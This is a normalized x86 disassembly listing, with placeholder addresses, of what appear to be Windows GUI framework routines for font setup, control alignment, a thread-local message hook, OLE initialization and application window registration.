and eax 0xffff
mov edx [ esp + 0xc ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x84
push edi
call __imp_SendMessageW
movzx eax ax
or eax 0x2000000
push eax
push edi
push 0x20
push edi
call SendMessageW
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_49dbe8
push ebp
mov ebp esp
add esp 0xfffffda8
push ebx
push esi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_49dd98
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
mov esi 0x5c
push 0x0
lea eax [ ebp - 0x60 ]
push eax
push esi
push 0x1f
call SystemParametersInfoW
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4a10dc
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_44c434
lea eax [ ebp - 0x60 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_44c434
jmp r-xdata
mov eax [ ebx + 0x7c ]
mov edx 0x8
call sub_44c564
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_44c434
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_44c434
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x8c ]
call sub_44c434
lea eax [ ebp - 0x11c ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x7c ]
call sub_44c434
lea eax [ ebp - 0x178 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_44c434
lea eax [ ebp - 0xc0 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_44c434
lea eax [ ebp - 0x240 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x8c ]
call sub_44c434
jmp r-xdata
call sub_40c7e4
mov esi eax
mov [ ebp - 0x258 ] esi
push 0x0
lea eax [ ebp - 0x258 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoW
test eax eax
je r-xdata
retn
movzx edx [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_4a10dc
mov eax [ ebx + 0x7c ]
mov edx 0xff000017
call sub_44c1c8
mov eax [ ebx + 0x84 ]
mov edx 0xff000007
call sub_44c1c8
mov eax [ ebx + 0x88 ]
mov edx 0xff000008
call sub_44c1c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49dd9f
cmp [ rw-data ] 0x0
je r-xdata
sub_49ddd8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
dec cl
je r-xdata
mov eax esi
call sub_496884
mov ebx eax
mov eax edi
call sub_496884
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_496884
mov ebx eax
add ebx [ edi + 0x4c ]
mov eax esi
call sub_496884
add eax [ esi + 0x4c ]
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax esi
call sub_496864
mov ebx eax
mov eax edi
call sub_496864
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax edi
call sub_496864
mov ebx eax
add ebx [ edi + 0x48 ]
mov eax esi
call sub_496864
add eax [ esi + 0x48 ]
cmp ebx eax
setl al
jmp r-xdata
sub_49de60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
movzx eax [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x29a ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_496864
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_496884
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x98 ]
cmp [ ebx + 0x29a ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_49dfa6 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add [ edx + 0xc ] eax
sub_49e01c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_49d58c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x5d ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4305a0
movzx edx [ ebp - 0x1 ]
call sub_49de60
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_49d578
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
movzx eax [ eax + 0x5d ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x29a ] 0x1
je r-xdata
cmp [ ebx + 0x29a ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4303e0
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x10 ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx ebx
mov edx esi
call sub_430658
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4305a0
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax ebx
call sub_49ddd8
test al al
je r-xdata
inc esi
sub_49e16c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_49d58c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx esi
call sub_49d578
cmp [ eax + 0x34 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5d ] 0x0
je r-xdata
cmp [ eax + 0x59 ] 0x0
je r-xdata
cmp [ eax + 0x29a ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_49e1c4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
push ebp
call sub_49e16c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_49e23e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_49e01c
pop ecx
push ebp
mov al 0x2
call sub_49e01c
pop ecx
push ebp
mov al 0x3
call sub_49e01c
pop ecx
push ebp
mov al 0x4
call sub_49e01c
pop ecx
push ebp
mov al 0x5
call sub_49e01c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_49e24c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49dda8
xor eax eax
push ebp
push sub_49e2c3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call __imp_SystemParametersInfoW_40c578
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_49e1c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x92 ] 0xffffffef
mov eax [ ebp - 0x4 ]
call sub_49ddb0
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x92 ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_49e2d0
push ebp
mov ebp esp
add esp 0xffffff9c
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_49e374
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x64 ]
xor ecx ecx
mov edx 0x5c
call sub_404c14
mov [ ebp - 0x4d ] 0x1
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
push sub_49d17c
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call EnumFontFamiliesExW
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov dl 0x1
call sub_433b00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_49e3b8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
xor edx edx
call sub_4070a8
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_4070a8
pop esi
pop ebx
retn
mov ebx [ ebx + 0x34 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_49e410
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_49e441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4a1818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_49e464
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_46f140
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4a18c4
sub_49e4c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4a02c4
sub_49e504
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xad ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax [ rw-data ]
push eax
push 0x3
call SetWindowsHookExW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_49e578
push ecx
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
push 0x0
push rw-data
call InterlockedExchange
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
pop edx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ esp ]
push eax
call CloseHandle
jmp r-xdata
push 0xff
push 0xffffffff
push 0x0
lea eax [ esp + 0xc ]
push eax
push 0x1
call MsgWaitForMultipleObjects
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_4a0570
sub_49e5f4
push ebx
add esp 0xfffffff8
mov ebx 0x8
mov [ esp ] ebx
push 0x0
lea eax [ esp + 0x4 ]
push eax
push ebx
push 0x48
call SystemParametersInfoW
test eax eax
je r-xdata
xor eax eax
cmp [ esp + 0x4 ] 0x0
setne al
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_49e624
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x49
call SystemParametersInfoW
pop ecx
pop edx
retn
sub_49e650
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_49e5f4
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_49e624
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_49e624
sub_49e680
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49d514
push eax
push esi
mov eax ebx
call sub_49d520
push eax
mov eax ebx
call sub_49d4fc
push eax
mov eax ebx
call sub_49d508
pop edx
pop ecx
call sub_40ac8c
pop esi
pop ebx
retn
sub_49e728
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
push [ esi + 0x4 ]
push [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_49d7a0
pop edi
pop esi
pop ebx
retn
sub_49e758
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_49d7a0
pop edi
pop esi
pop ebx
retn
sub_49e784
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_49d7a0
pop edi
pop esi
pop ebx
retn
sub_49e7b0
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x5c ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x5c ]
mov edx esi
call sub_4305a0
call sub_4055f0
inc esi
dec ebx
jne r-xdata
sub_49e80c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_49d540
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_49d52c
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_49d52c
call sub_49d158
test al al
je r-xdata
sub_49e85c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push ebp
call sub_49e80c
pop ecx
test eax eax
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_49e7e8
push ebp
call sub_49e80c
pop ecx
sub_49e89c
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c14c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
push 0x0
call OleInitialize
test eax 0x80000000
sete al
mov [ ebx + 0x17c ] al
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4a0994
mov [ ebx + 0x35 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov esi eax
mov [ ebx + 0x3c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4a1154
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0xb0 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0xa5 ] 0x1
mov [ ebx + 0xbc ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_452dd4
mov esi eax
mov [ ebx + 0xa0 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconW
mov edx eax
mov eax esi
call sub_453268
mov eax [ ebx + 0xa0 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4a143c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x98 ] eax
push 0x100
lea eax [ ebp - 0x202 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameW
lea eax [ ebp - 0x202 ]
mov dx 0x5c
call sub_4127b8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4a0ba4
lea eax [ ebp - 0x202 ]
mov dx 0x2e
call sub_41279c
test eax eax
je r-xdata
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x202 ]
call sub_41259c
lea eax [ ebp - 0x202 ]
push eax
call CharNextW
push eax
call CharLowerW
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x202 ]
mov ecx 0x100
call sub_407290
push ebx
push sub_4a0364
call sub_4944f0
mov [ ebx + 0x178 ] eax
mov [ ebx + 0xd0 ] 0x0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0xa6 ] 0x1
mov [ ebx + 0xd1 ] 0x0
mov [ ebx + 0xdc ] 0x0
xor eax eax
mov [ ebx + 0xd4 ] eax
mov [ ebx + 0xd3 ] 0x0
xor eax eax
mov [ ebx + 0xa8 ] eax
mov eax ebx
call sub_4a1668
mov eax ebx
call sub_4a229c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_49ec68
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_49eaf3
add [ ebp ] cl
inc ecx
add [ ecx ] cl
dec esi
add [ ecx ] cl
inc ebx
add [ edi ] cl
dec esi
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_4a22ac
mov [ esp + 0x4 ] esi
mov [ esp ] sub_4a0994
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_4a0ba4
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0xa5 ] 0x0
mov eax esi
call sub_4a18c4
xor edx edx
mov eax esi
call sub_4a10dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c198
mov eax [ esi + 0x178 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
push esi
push sub_49f3cc
mov eax esi
call sub_4a05f4
mov eax [ esi + 0x170 ]
test eax eax
je r-xdata
call sub_494504
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xac ] 0x0
je r-xdata
mov eax [ esi + 0x174 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_409cb4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xb0 ]
call sub_4055f0
mov eax [ esi + 0x90 ]
call sub_4055f0
mov eax [ esi + 0x98 ]
call sub_4055f0
mov eax [ esi + 0xa0 ]
call sub_4055f0
lea eax [ esi + 0x3c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
cmp [ esi + 0x17c ] 0x0
je r-xdata
call sub_4944e8
mov eax [ esi + 0x170 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call __imp_SendMessageW
test bl bl
jle r-xdata
call OleUninitialize
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_49ec68
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_49ee19
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xac ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49ee20
lea eax [ ebp - 0x2c ]
call j_sub_4068a0
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_49f558
call sub_4944d4
mov [ ebx + 0x174 ] eax
mov eax DefWindowProcW
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoW
test eax eax
jne r-xdata
push 0x84ca0000
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassW
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_407134
mov ecx eax
mov edx [ rw-data ]
mov eax 0x80
call sub_40c5c8
mov [ ebx + 0x170 ] eax
mov [ ebx + 0xac ] 0x1
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x170 ]
push eax
call SetWindowLongW
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_49fcf8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x170 ]
push eax
call __imp_SendMessageW
mov eax ebx
call sub_49fcf8
push eax
push 0xfffffff2
mov eax [ ebx + 0x170 ]
push eax
call SetClassLongW
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_49ee28
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
